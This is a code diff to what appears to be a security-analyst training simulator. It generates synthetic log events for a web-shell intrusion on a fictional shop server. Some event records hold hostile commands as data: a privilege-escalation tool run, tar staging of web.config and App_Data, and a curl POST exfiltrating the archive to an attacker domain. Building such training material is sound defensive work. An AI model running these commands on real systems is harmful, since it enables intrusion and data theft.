@@ -8,6 +8,11 @@
  * answer-bearing out of this file: every visitor can read it.
  */
 import type { TelemetryEvent } from "@/lib/sim/types";
+import { makeSha256 } from "@/lib/sim/iocs";
+import { serviceNowRecord } from "@/lib/sim/emitters/servicenow";
+import { mdeProcess, mdeFile, mdeAlert } from "@/lib/sim/emitters/mde";
+import { panConnection } from "@/lib/sim/emitters/paloalto";
+import { infobloxDns } from "./nativeRecords.events";
 
 /** Telemetry half of `buildWebShellRceScenario`: the events and the story title, no answer key. */
 export function webShellRceScenarioEvents() {
@@ -47,7 +52,144 @@ export function webShellRceScenarioEvents() {
   const uaChrome =
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
 
+  const cx = { companyId: "nexacorp" as const };
+  const DEVICE_NAME = "web-shop-01.nexacorp.com";
+  const DEVICE_ID = "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2";
+  const POOL_SID = "S-1-5-82-1274839021-3315088842-4194903328-2971184652-1108255477";
+  const W3WP_CMD = "w3wp.exe -ap \"ShopPortal\" -v \"v4.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipm5e4a1c30-7f21-4b9d-a0c4-2d81b6e9f307 -h \"C:\\inetpub\\temp\\apppools\\ShopPortal\\ShopPortal.config\" -w \"\" -m 0";
+  const shellUrlPath = "/assets/js/vendor/bootstrap.bundle.aspx";
+  const vendorDir = "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor";
+  const sys32 = "C:\\Windows\\System32\\";
+  const hashes = {
+    w3wp: makeSha256("windows_system32_inetsrv_w3wp_exe_signed_microsoft"),
+    cmd: makeSha256("windows_system32_cmd_exe_signed_microsoft"),
+    tar: makeSha256("windows_system32_tar_exe_signed_microsoft"),
+    curl: makeSha256("windows_system32_curl_exe_signed_microsoft"),
+  };
+
+  // A Defender for Endpoint process row on WEB-SHOP-01, in the same dialect as the rows authored
+  // above it (DeviceName is the lower-case FQDN, FolderPath includes the file name).
+  const mdeRow = (id: string, ts: string, p: {
+    name: string; path: string; cmdline: string; parent: string; parentPid: number; pid: number; sha: string;
+    system?: boolean; parentSystem?: boolean; signed?: boolean; mitre?: string; tactic?: string; severity?: "low" | "medium" | "high" | "critical"; description: string;
+  }): TelemetryEvent => {
+    const e = mdeProcess({
+      ...cx, id, ts, host: web.hostname, srcIp: web.ip, user: null,
+      processName: p.name, processPath: p.path, cmdline: p.cmdline, parentName: p.parent, parentPid: p.parentPid, pid: p.pid,
+      sha256: p.sha, integrity: p.system ? "System" : "High", signed: p.signed ?? true,
+      runAsUser: p.system ? "NT AUTHORITY\\SYSTEM" : "IIS APPPOOL\\ShopPortal",
+      accountName: p.system ? "SYSTEM" : "ShopPortal", accountDomain: p.system ? "NT AUTHORITY" : "IIS APPPOOL",
+      mitre: p.mitre, tactic: p.tactic, severity: p.severity ?? "low", description: p.description,
+    });
+    Object.assign(e.raw, {
+      "Timestamp": ts, "DeviceName": DEVICE_NAME, "DeviceId": DEVICE_ID, "FolderPath": p.path,
+      "AccountSid": p.system ? "S-1-5-18" : POOL_SID, "ProcessTokenElevation": "TokenElevationTypeDefault",
+      "InitiatingProcessAccountDomain": p.parentSystem ? "NT AUTHORITY" : "IIS APPPOOL",
+      "InitiatingProcessAccountName": p.parentSystem ? "SYSTEM" : "ShopPortal",
+    });
+    return e;
+  };
+
+  // AWS WAF record for a request the web ACL let through (nothing terminated it).
+  const wafAllow = (id: string, offsetMs: number, o: { method: "GET" | "POST"; uri: string; args: string; contentType?: string; length: number; requestId: string; description: string }): TelemetryEvent => ({
+    id, ts: T(offsetMs), source: "waf", vendor: "AWS WAF", event_type: "waf_allow",
+    hostname: web.hostname, src_ip: atkC, dst_ip: web.ip, dst_port: 443, protocol: "tcp", severity: "low",
+    network: { url: `https://${web.site}${o.uri}`, domain: web.site, method: o.method, user_agent: uaChrome },
+    description: o.description,
+    raw: {
+      formatVersion: 1,
+      timestamp: B + offsetMs,
+      webaclId: webAclArn,
+      terminatingRuleId: "Default_Action",
+      terminatingRuleType: "REGULAR",
+      action: "ALLOW",
+      terminatingRuleMatchDetails: [],
+      httpSourceName: "ALB",
+      httpSourceId: albId,
+      "ruleGroupList[0].ruleGroupId": "AWS#AWSManagedRulesCommonRuleSet",
+      "ruleGroupList[0].terminatingRule": null,
+      "ruleGroupList[0].nonTerminatingMatchingRules": [],
+      "ruleGroupList[0].excludedRules": null,
+      "ruleGroupList[1].ruleGroupId": "AWS#AWSManagedRulesSQLiRuleSet",
+      "ruleGroupList[1].terminatingRule": null,
+      "ruleGroupList[1].nonTerminatingMatchingRules": [],
+      "ruleGroupList[1].excludedRules": null,
+      rateBasedRuleList: [],
+      nonTerminatingMatchingRules: [],
+      requestHeadersInserted: null,
+      responseCodeSent: null,
+      "httpRequest.clientIp": atkC,
+      "httpRequest.country": "RU",
+      "httpRequest.httpMethod": o.method,
+      "httpRequest.uri": o.uri,
+      "httpRequest.args": o.args,
+      "httpRequest.httpVersion": "HTTP/1.1",
+      "httpRequest.requestId": o.requestId,
+      "httpRequest.headers[0].name": "Host",
+      "httpRequest.headers[0].value": "shop.nexacorp.com",
+      "httpRequest.headers[1].name": "User-Agent",
+      "httpRequest.headers[1].value": uaChrome,
+      "httpRequest.headers[2].name": "Content-Type",
+      "httpRequest.headers[2].value": o.contentType ?? "application/x-www-form-urlencoded",
+      "httpRequest.headers[3].name": "Content-Length",
+      "httpRequest.headers[3].value": String(o.length),
+    },
+  });
+
+  // IIS W3C access-log row (Sentinel W3CIISLog table) for a request to the dropped web shell.
+  const shellCall = (id: string, offsetMs: number, utc: string, o: { scBytes: number; csBytes: number; taken: number; description: string }): TelemetryEvent => ({
+    id, ts: T(offsetMs), source: "siem", vendor: "Microsoft Sentinel", event_type: "http_request",
+    hostname: web.hostname, dst_ip: web.ip, dst_port: 443, protocol: "tcp", severity: "medium",
+    network: { url: `https://${web.site}${shellUrlPath}`, domain: web.site, method: "POST", status: 200, user_agent: uaChrome },
+    description: o.description,
+    raw: {
+      TimeGenerated: utc,
+      Computer: "WEB-SHOP-01.nexacorp.com",
+      sSiteName: "SHOPPORTAL",
+      sComputerName: "WEB-SHOP-01",
+      sIP: "10.40.12.21",
+      sPort: "443",
+      csMethod: "POST",
+      csUriStem: shellUrlPath,
+      csUriQuery: "-",
+      csUserName: "-",
+      cIP: albIp,
+      csHost: "shop.nexacorp.com",
+      csUserAgent: uaChrome,
+      csReferer: "-",
+      scStatus: "200",
+      scSubStatus: "0",
+      scWin32Status: "0",
+      scBytes: String(o.scBytes),
+      csBytes: String(o.csBytes),
+      TimeTaken: String(o.taken),
+      csVersion: "HTTP/1.1",
+      Type: "W3CIISLog",
+    },
+  });
+
   const events: TelemetryEvent[] = [
+    // ── CONTEXT: the change record that authorises the external scanner ────────
+    serviceNowRecord({
+      ...cx, id: "evt_00_asv_change", ts: T(-(6 * 24 + 3) * 60 * MIN), table: "change_request", number: "CHG0042611", state: "Scheduled",
+      shortDescription: "Quarterly PCI ASV external vulnerability scan of shop.nexacorp.com", severity: "informational",
+      extra: {
+        "servicenow.type": "Standard", "servicenow.approval": "Approved", "servicenow.risk": "Low",
+        "servicenow.assignment_group": "Security Operations", "servicenow.requested_by": "m.levi@nexacorp.com", "servicenow.approved_by": "CAB - Security",
+        "servicenow.cmdb_ci": "shop-prod-alb", "servicenow.start_date": "2026-03-17 09:00:00", "servicenow.end_date": "2026-03-17 11:00:00",
+        "servicenow.description": "External PCI ASV scan of shop.nexacorp.com by the Qualys cloud scanner. Scanner source address 64.39.106.131 is allow-listed on the web ACL for the window (times UTC).",
+        "servicenow.sys_updated_on": "2026-03-11 06:00:00",
+      },
+      description: "Change CHG0042611 schedules the quarterly external PCI ASV scan of shop.nexacorp.com for 09:00 to 11:00 UTC on 17 March from the scanner address 64.39.106.131.",
+    }),
+
+    // ── CONTEXT: the IIS worker process the app pool runs in ───────────────────
+    mdeRow("evt_00a_w3wp_start", T(-45 * MIN - 2_000), {
+      name: "w3wp.exe", path: `${sys32}inetsrv\\w3wp.exe`, cmdline: W3WP_CMD, parent: "svchost.exe", parentPid: 1464, pid: 6188,
+      sha: hashes.w3wp, parentSystem: true,
+      description: "The IIS worker process for the ShopPortal application pool started on WEB-SHOP-01 as IIS APPPOOL\\ShopPortal, parent svchost.exe.",
+    }),
+
     // ── CONTEXT: what the web server's service account is allowed to do ────────
     {
       id: "evt_01_apppool_privileges",
@@ -124,9 +266,52 @@ export function webShellRceScenarioEvents() {
       },
     },
 
+    {
+      id: "evt_02b_recon_sweep_2",
+      ts: T(31_000),
+      source: "siem",
+      vendor: "Microsoft Sentinel",
+      event_type: "http_request",
+      hostname: web.hostname,
+      src_ip: atkA,
+      dst_ip: web.ip,
+      dst_port: 443,
+      protocol: "tcp",
+      severity: "low",
+      mitre_technique: "T1595.003",
+      mitre_tactic: "Reconnaissance",
+      network: { url: `https://${web.site}/wp-login.php`, domain: web.site, method: "GET", status: 404, user_agent: uaPython },
+      description:
+        "A second IIS access record from the same burst: GET /wp-login.php, 404, User-Agent python-requests.",
+      raw: {
+        TimeGenerated: "2026-03-17T09:00:31.208Z",
+        Computer: "WEB-SHOP-01.nexacorp.com",
+        sSiteName: "SHOPPORTAL",
+        sComputerName: "WEB-SHOP-01",
+        sIP: "10.40.12.21",
+        sPort: "443",
+        csMethod: "GET",
+        csUriStem: "/wp-login.php",
+        csUriQuery: "-",
+        csUserName: "-",
+        cIP: albIp,
+        csHost: "shop.nexacorp.com",
+        csUserAgent: uaPython,
+        csReferer: "-",
+        scStatus: "404",
+        scSubStatus: "0",
+        scWin32Status: "2",
+        scBytes: "1245",
+        csBytes: "311",
+        TimeTaken: "3",
+        csVersion: "HTTP/1.1",
+        Type: "W3CIISLog",
+      },
+    },
+
     // ── NOISE: the authorized quarterly ASV scan trips the same signatures ─────
     {
-      id: "evt_03_authorized_scan",
+      id: "evt_03_waf_block_sqli_q",
       ts: T(6 * MIN),
       source: "waf",
       vendor: "AWS WAF",
@@ -139,7 +324,7 @@ export function webShellRceScenarioEvents() {
       severity: "low",
       expected_verdict: "fp",
       fp_explanation:
-        "64.39.106.131 is inside the Qualys cloud scanner range that NexaCorp whitelisted for its quarterly PCI ASV external scan (change record CHG-2026-0311, window 09:00–11:00 UTC on 17 Mar). The scanner fires the whole SQLi payload catalogue at every parameter it finds and the WAF blocks all of it — high volume, uniform payloads, a single source IP that never rotates, and a self-identifying User-Agent. It is scanning noise, not exploitation.",
+        "64.39.106.131 is inside the Qualys cloud scanner range that NexaCorp whitelisted for its quarterly PCI ASV external scan (change record CHG0042611, window 09:00 to 11:00 UTC on 17 Mar). The scanner fires the whole SQLi payload catalogue at every parameter it finds and the WAF blocks all of it — high volume, uniform payloads, a single source IP that never rotates, and a self-identifying User-Agent. It is scanning noise, not exploitation.",
       network: { url: `https://${web.site}/products/search.aspx`, domain: web.site, method: "GET", status: 403, user_agent: uaQualys },
       description:
         "AWS WAF blocked a SQL injection payload from 64.39.106.131. Representative of a sustained burst from this single address across many parameters and paths.",
@@ -478,6 +663,12 @@ export function webShellRceScenarioEvents() {
       },
     },
 
+    wafAllow("evt_09a_waf_allow_post", 47 * MIN - 400, {
+      method: "POST", uri: "/admin/content/upload.ashx", args: "key=d0f4a1c8-7b23-4e19-9a56-cc81e0b47f3d&target=assets%2Fjs%2Fvendor&name=bootstrap.bundle.aspx",
+      contentType: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW", length: 9614, requestId: "1-67d8548c-4b6d19e0a52f7c3318de6a41",
+      description: "AWS WAF returned ALLOW on a 9,614-byte POST to /admin/content/upload.ashx from 91.242.229.35, Chrome browser User-Agent.",
+    }),
+
     // ── DELIVERY: the stolen key is used against the legacy upload handler ────
     {
       id: "evt_10_iis_upload_201",
@@ -548,20 +739,25 @@ export function webShellRceScenarioEvents() {
         DeviceId: "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2",
         ActionType: "FileCreated",
         FileName: "bootstrap.bundle.aspx",
-        FolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor",
+        FolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\bootstrap.bundle.aspx",
         SHA256: shellHash,
         FileSize: "8917",
         InitiatingProcessFileName: "w3wp.exe",
-        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv",
-        InitiatingProcessCommandLine: "w3wp.exe -ap \"ShopPortal\" -v \"v4.0\" -c \"C:\\Windows\\...\\aspnet.config\"",
+        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+        InitiatingProcessCommandLine: W3WP_CMD,
         InitiatingProcessId: "6188",
         InitiatingProcessAccountDomain: "IIS APPPOOL",
         InitiatingProcessAccountName: "ShopPortal",
-        InitiatingProcessIntegrityLevel: "Medium",
+        InitiatingProcessIntegrityLevel: "High",
         InitiatingProcessTokenElevation: "TokenElevationTypeDefault",
         ReportId: "44127",
       },
     },
+
+    wafAllow("evt_11a_waf_allow_post", 51 * MIN + 59_600, {
+      method: "POST", uri: shellUrlPath, args: "", length: 418, requestId: "1-67d856a7-0d5c3e91b8a24f7611c9e035",
+      description: "AWS WAF returned ALLOW on a 418-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
+    }),
 
     // ── EXECUTION: first command through the shell, at the app pool's level ───
     {
@@ -582,10 +778,8 @@ export function webShellRceScenarioEvents() {
         parent_pid: 6188,
         cmdline: "cmd.exe /c whoami /priv & hostname & ipconfig /all",
         user: "IIS APPPOOL\\ShopPortal",
-        integrity: "medium",
+        integrity: "high",
       },
-      is_detection: true, // alert-grade: the Defender detection that opened the ticket — the IIS worker spawning cmd.exe (web shell RCE, the crux)
-      edr_scope: "edr",   // server-primary RCE incident → investigated in the EDR console
       description:
         "w3wp.exe spawned cmd.exe on WEB-SHOP-01, running whoami /priv, hostname and ipconfig /all in a single chained command line.",
       raw: {
@@ -597,20 +791,46 @@ export function webShellRceScenarioEvents() {
         FolderPath: "C:\\Windows\\System32\\cmd.exe",
         ProcessCommandLine: "cmd.exe /c whoami /priv & hostname & ipconfig /all",
         ProcessId: "7304",
-        ProcessIntegrityLevel: "Medium",
+        ProcessIntegrityLevel: "High",
         ProcessTokenElevation: "TokenElevationTypeDefault",
         AccountDomain: "IIS APPPOOL",
         AccountName: "ShopPortal",
         AccountSid: "S-1-5-82-1274839021-3315088842-4194903328-2971184652-1108255477",
         InitiatingProcessFileName: "w3wp.exe",
-        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv",
+        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
         InitiatingProcessId: "6188",
         InitiatingProcessAccountDomain: "IIS APPPOOL",
         InitiatingProcessAccountName: "ShopPortal",
-        InitiatingProcessIntegrityLevel: "Medium",
+        InitiatingProcessIntegrityLevel: "High",
         ReportId: "44503",
       },
     },
+
+    shellCall("evt_12_iis_post_1", 52 * MIN + 2_100, "2026-03-17T09:52:02.108Z", {
+      scBytes: 1186, csBytes: 418, taken: 2204,
+      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 1,186 bytes returned in 2,204 ms.",
+    }),
+
+    {
+      ...mdeAlert({
+        ...cx, id: "evt_12_edr_alert", ts: T(52 * MIN + 20_000), host: web.hostname, srcIp: web.ip, user: null,
+        alertTitle: "Suspicious process spawned by IIS worker (possible web shell)", category: "Execution", mitre: "T1059.003",
+        techniqueName: "Windows Command Shell", detectionSource: "EDR", alertSeverity: "High", severity: "high",
+        extra: {
+          "AccountName": "ShopPortal", "AccountDomain": "IIS APPPOOL", "FileName": "cmd.exe", "ProcessId": "7304",
+          "mde.DeviceName": DEVICE_NAME, "mde.EntityType": "Process", "mde.AlertStatus": "New", "mde.ServiceSource": "Microsoft Defender for Endpoint", "ReportId": "44521",
+        },
+        description:
+          "Defender for Endpoint raised a High-severity alert on WEB-SHOP-01: the IIS worker process w3wp.exe spawned cmd.exe (pid 7304).",
+      }),
+      edr_scope: "edr",   // server-primary RCE incident → investigated in the EDR console
+    },
+
+    wafAllow("evt_12a_waf_allow_post", 55 * MIN - 400, {
+      method: "POST", uri: "/admin/content/upload.ashx", args: "key=d0f4a1c8-7b23-4e19-9a56-cc81e0b47f3d&target=assets%2Fjs%2Fvendor&name=srv.exe",
+      contentType: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW", length: 7842, requestId: "1-67d85a83-71e4c2f09b6d3a5818ef2c40",
+      description: "AWS WAF returned ALLOW on a 7,842-byte POST to /admin/content/upload.ashx from 91.242.229.35, Chrome browser User-Agent.",
+    }),
 
     // ── DELIVERY: the privesc tool goes up through the same legacy handler ────
     {
@@ -671,7 +891,7 @@ export function webShellRceScenarioEvents() {
         name: "srv.exe",
         path: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\srv.exe",
         sha256: spoofHash,
-        size: 7842,
+        size: 7168,
         extension: "exe",
       },
       description:
@@ -682,24 +902,43 @@ export function webShellRceScenarioEvents() {
         DeviceId: "a9f4c21b7d08e3561ca4907fb2e8d3170c95a4e2",
         ActionType: "FileCreated",
         FileName: "srv.exe",
-        FolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor",
+        FolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\srv.exe",
         SHA256: spoofHash,
-        FileSize: "7842",
+        FileSize: "7168",
         InitiatingProcessFileName: "w3wp.exe",
-        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv",
-        InitiatingProcessCommandLine: "w3wp.exe -ap \"ShopPortal\" -v \"v4.0\" -c \"C:\\Windows\\...\\aspnet.config\"",
+        InitiatingProcessFolderPath: "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+        InitiatingProcessCommandLine: W3WP_CMD,
         InitiatingProcessId: "6188",
         InitiatingProcessAccountDomain: "IIS APPPOOL",
         InitiatingProcessAccountName: "ShopPortal",
-        InitiatingProcessIntegrityLevel: "Medium",
+        InitiatingProcessIntegrityLevel: "High",
         InitiatingProcessTokenElevation: "TokenElevationTypeDefault",
         ReportId: "44718",
       },
     },
 
+    wafAllow("evt_12c_waf_allow_post", 57 * MIN + 19_600, {
+      method: "POST", uri: shellUrlPath, args: "", length: 463, requestId: "1-67d85c2f-5a0b91d3e7c24f6812ab9d37",
+      description: "AWS WAF returned ALLOW on a 463-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
+    }),
+    mdeRow("evt_12c_cmd_run_srv", T(57 * MIN + 20_000), {
+      name: "cmd.exe", path: `${sys32}cmd.exe`, cmdline: `cmd.exe /c ${vendorDir}\\srv.exe -i -c cmd.exe`, parent: "w3wp.exe", parentPid: 6188, pid: 7612,
+      sha: hashes.cmd, mitre: "T1059.003", tactic: "Execution", severity: "medium",
+      description: "w3wp.exe spawned cmd.exe (pid 7612) on WEB-SHOP-01, running the uploaded srv.exe from the vendor asset folder.",
+    }),
+    mdeRow("evt_12d_srv_run", T(57 * MIN + 21_000), {
+      name: "srv.exe", path: `${vendorDir}\\srv.exe`, cmdline: "srv.exe -i -c \"cmd.exe\"", parent: "cmd.exe", parentPid: 7612, pid: 7952,
+      sha: spoofHash, signed: false, mitre: "T1134.001", tactic: "Privilege Escalation", severity: "high",
+      description: "srv.exe started on WEB-SHOP-01 from the vendor asset folder as IIS APPPOOL\\ShopPortal, parent cmd.exe (pid 7612).",
+    }),
+    shellCall("evt_12e_iis_post_2", 57 * MIN + 22_000, "2026-03-17T09:57:22.031Z", {
+      scBytes: 874, csBytes: 463, taken: 2411,
+      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 874 bytes returned in 2,411 ms.",
+    }),
+
     // ── ESCALATION: SeImpersonatePrivilege from evt_01 is cashed in ───────────
     {
-      id: "evt_13_printspoofer_system",
+      id: "evt_13_srv_child_cmd",
       ts: T(58 * MIN),
       source: "edr",
       vendor: "Microsoft Defender for Endpoint",
@@ -735,17 +974,69 @@ export function webShellRceScenarioEvents() {
         AccountName: "SYSTEM",
         AccountSid: "S-1-5-18",
         InitiatingProcessFileName: "srv.exe",
-        InitiatingProcessFolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor",
+        InitiatingProcessFolderPath: "C:\\inetpub\\wwwroot\\shop\\assets\\js\\vendor\\srv.exe",
         InitiatingProcessCommandLine: "srv.exe -i -c \"cmd.exe\"",
         InitiatingProcessId: "7952",
         InitiatingProcessSHA256: spoofHash,
         InitiatingProcessAccountDomain: "IIS APPPOOL",
         InitiatingProcessAccountName: "ShopPortal",
-        InitiatingProcessIntegrityLevel: "Medium",
+        InitiatingProcessIntegrityLevel: "High",
         InitiatingProcessTokenElevation: "TokenElevationTypeDefault",
         ReportId: "44861",
       },
     },
+
+    // ── STAGING: the SYSTEM shell packs the files it wants ───────────────────
+    wafAllow("evt_13a_waf_allow_post", 61 * MIN + 38_600, {
+      method: "POST", uri: shellUrlPath, args: "", length: 529, requestId: "1-67d85dd2-3c8e0a57f1b64d9923c7e810",
+      description: "AWS WAF returned ALLOW on a 529-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
+    }),
+    mdeRow("evt_13b_tar_run", T(61 * MIN + 40_000), {
+      name: "tar.exe", path: `${sys32}tar.exe`,
+      cmdline: "tar.exe -cf C:\\Windows\\Temp\\ib.dat -C C:\\inetpub\\wwwroot\\shop web.config App_Data",
+      parent: "cmd.exe", parentPid: 8016, pid: 8148, sha: hashes.tar, system: true, parentSystem: true, mitre: "T1560.001", tactic: "Collection", severity: "medium",
+      description: "tar.exe (pid 8148), a child of the SYSTEM cmd.exe, packed web.config and App_Data from the shop folder into C:\\Windows\\Temp\\ib.dat.",
+    }),
+    shellCall("evt_13c_iis_post_3", 61 * MIN + 41_500, "2026-03-17T10:01:41.512Z", {
+      scBytes: 301, csBytes: 529, taken: 2894,
+      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 301 bytes returned in 2,894 ms.",
+    }),
+    (() => {
+      const e = mdeFile({
+        ...cx, id: "evt_13d_ib_dat_written", ts: T(61 * MIN + 46_000), host: web.hostname, srcIp: web.ip, user: null,
+        path: "C:\\Windows\\Temp\\ib.dat", sha256: null, size: 5_918_204, action: "file_create", initiatingProcess: "tar.exe",
+        initiatingCmdline: "tar.exe -cf C:\\Windows\\Temp\\ib.dat -C C:\\inetpub\\wwwroot\\shop web.config App_Data", severity: "medium",
+        mitre: "T1560.001", tactic: "Collection",
+        description: "ib.dat (5,918,204 bytes) was written to C:\\Windows\\Temp on WEB-SHOP-01 by tar.exe.",
+      });
+      Object.assign(e.raw, {
+        "Timestamp": e.ts, "DeviceName": DEVICE_NAME, "DeviceId": DEVICE_ID, "FolderPath": "C:\\Windows\\Temp\\ib.dat",
+        "InitiatingProcessFolderPath": `${sys32}tar.exe`, "InitiatingProcessId": "8148",
+        "InitiatingProcessAccountDomain": "NT AUTHORITY", "InitiatingProcessAccountName": "SYSTEM", "InitiatingProcessIntegrityLevel": "System", "ReportId": "45002",
+      });
+      return e;
+    })(),
+
+    // ── EXFIL PRELUDE: the last shell call, the SYSTEM command prompt starts curl ─
+    wafAllow("evt_13e_waf_allow_post", 63 * MIN + 53_600, {
+      method: "POST", uri: shellUrlPath, args: "", length: 571, requestId: "1-67d85e48-0f9a2b6c83d71e4a05fb3c92",
+      description: "AWS WAF returned ALLOW on a 571-byte POST to /assets/js/vendor/bootstrap.bundle.aspx from 91.242.229.35, Chrome browser User-Agent.",
+    }),
+    mdeRow("evt_13f_curl_start", T(63 * MIN + 55_000), {
+      name: "curl.exe", path: `${sys32}curl.exe`,
+      cmdline: "curl.exe -k -s -X POST --data-binary @C:\\Windows\\Temp\\ib.dat https://cdn-shopassets.link/u",
+      parent: "cmd.exe", parentPid: 8016, pid: 8244, sha: hashes.curl, system: true, parentSystem: true, mitre: "T1041", tactic: "Exfiltration", severity: "high",
+      description: "curl.exe (pid 8244), a child of the SYSTEM cmd.exe, was started to POST C:\\Windows\\Temp\\ib.dat to https://cdn-shopassets.link/u.",
+    }),
+    infobloxDns({
+      id: "evt_13g_dns_c2", ts: T(63 * MIN + 56_000), host: web.hostname, srcIp: web.ip,
+      query: c2Dom, answer: c2Ip, member: "DNS-DMZ-01",
+      description: "WEB-SHOP-01 resolved cdn-shopassets.link to 194.26.29.114, answered NOERROR by the DMZ Infoblox resolver DNS-DMZ-01.",
+    }),
+    shellCall("evt_13h_iis_post_4", 63 * MIN + 56_500, "2026-03-17T10:03:56.502Z", {
+      scBytes: 198, csBytes: 571, taken: 1013,
+      description: "IIS answered a POST to /assets/js/vendor/bootstrap.bundle.aspx with 200, 198 bytes returned in 1,013 ms.",
+    }),
 
     // ── EXFIL: the SYSTEM shell ships the staged data out ────────────────────
     {
@@ -762,9 +1053,9 @@ export function webShellRceScenarioEvents() {
       severity: "critical",
       mitre_technique: "T1041",
       mitre_tactic: "Exfiltration",
-      network: { url: `https://${c2Dom}/u`, domain: c2Dom, bytes_out: 3312486, bytes_in: 214 },
+      network: { url: `https://${c2Dom}/u`, domain: c2Dom, bytes_out: 5918204, bytes_in: 214 },
       description:
-        "curl.exe running as SYSTEM POSTed C:\\Windows\\Temp\\ib.dat to https://cdn-shopassets.link/u (194.26.29.114) — 3,312,486 bytes out, 214 in.",
+        "curl.exe running as SYSTEM POSTed C:\\Windows\\Temp\\ib.dat to https://cdn-shopassets.link/u (194.26.29.114) — 5,918,204 bytes out, 214 in.",
       raw: {
         Timestamp: "2026-03-17T10:04:00.552Z",
         DeviceName: "web-shop-01.nexacorp.com",
@@ -789,10 +1080,22 @@ export function webShellRceScenarioEvents() {
         ReportId: "45119",
       },
     },
+
+    // ── EGRESS: the firewall's session record for the same upload ──────────────
+    (() => {
+      const e = panConnection({
+        ...cx, id: "evt_14a_egress_session", ts: T(64 * MIN + 8_000), host: web.hostname, srcIp: web.ip, user: null,
+        dstIp: c2Ip, remotePort: 443, app: "ssl", action: "allow", end: true, category: "unknown",
+        bytesOut: 5_931_480, bytesIn: 4_212, elapsedSec: 8, severity: "medium",
+        description: "An 8-second outbound TLS session from WEB-SHOP-01 (10.40.12.21) to 194.26.29.114:443 closed, 5,931,480 bytes sent and 4,212 received, allowed by rule DMZ-Servers-Outbound.",
+      });
+      Object.assign(e.raw, { "pan.rule": "DMZ-Servers-Outbound", "pan.from_zone": "dmz", "pan.to_zone": "untrust", "pan.sport": "50188", "pan.session_id": "7741206" });
+      return e;
+    })(),
   ];
 
   // Every event belongs to the one incident.
   for (const e of events) e.incident_id = INCIDENT;
 
-  return { title: "SQL Injection → Web Shell → Server Compromise", events, T, MIN, web, atkA, atkB, atkC, c2Ip, c2Dom, shellHash, spoofHash };
+  return { title: "WAF blocks and an EDR alert on the shop", events, T, MIN, web, atkA, atkB, atkC, c2Ip, c2Dom, shellHash, spoofHash };
 }
